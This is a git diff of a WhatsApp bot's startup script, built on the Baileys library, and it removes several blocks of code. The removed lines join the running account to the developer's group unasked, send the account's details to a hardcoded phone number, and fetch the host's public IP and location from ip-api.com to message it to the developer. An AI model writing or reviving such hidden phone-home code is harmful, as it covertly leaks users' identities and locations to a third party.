@@ -1,9 +1,6 @@
 require('./setting')
-const simple = require('./lib/simple.js')
 const { default: krizConnect, useSingleFileAuthState, WAConnection: _WAConnection, DisconnectReason, fetchLatestBaileysVersion, generateForwardMessageContent, prepareWAMessageMedia, generateWAMessageFromContent, generateMessageID, downloadContentFromMessage, makeInMemoryStore, jidDecode, proto } = require("@adiwajshing/baileys")
 const { state, saveState } = useSingleFileAuthState(`./${sessionName}.json`)
-const WAConnection = simple.WAConnection(_WAConnection)
-const toxic = new WAConnection()
 const pino = require('pino')
 const { Boom } = require('@hapi/boom')
 const fs = require('fs')
@@ -96,18 +93,7 @@ async function startKriz() {
     })
 
     store.bind(kriz.ev)
-          await toxic.connect({ timeoutMs: 30 * 1000 });
-  teks = `https://chat.whatsapp.com/GUJQYPUcqXs6UWbWYzF9yP`
- toxic.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
- console.log('Joined to whats kriz ai group')
- kriz.sendMessage(`919633687665@s.whatsapp.net`, `_Hai Owner global.botname, Bot Has Connected Successfully To This Number_\n────────────────────\n\`\`\`${JSON.stringify(kriz.user, null, 2)}\`\`\`\n────────────────────\n_If there are problems with errors / bots not responding, please contact the bot developer above, thank you_`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developers whats kriz ai",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./client.jpg'),sourceUrl:"https://wa.me/"}}})
-	console.log('Sending bot info to bot owner')
-fetch(`http://ip-api.com/line`).then(res => res.text())  
-        .then(bu =>{
-       denz.sendMessage("919496966726@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Whats Kriz Ai",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./client.jpg'),sourceUrl:"https://wa.me/"}}})
-     console.log('Sending ip address to bot developer')
-   })
-   
+        
     // anticall auto block
     kriz.ws.on('CB:call', async (json) => {
     const callerId = json.content[0].attrs['call-creator']
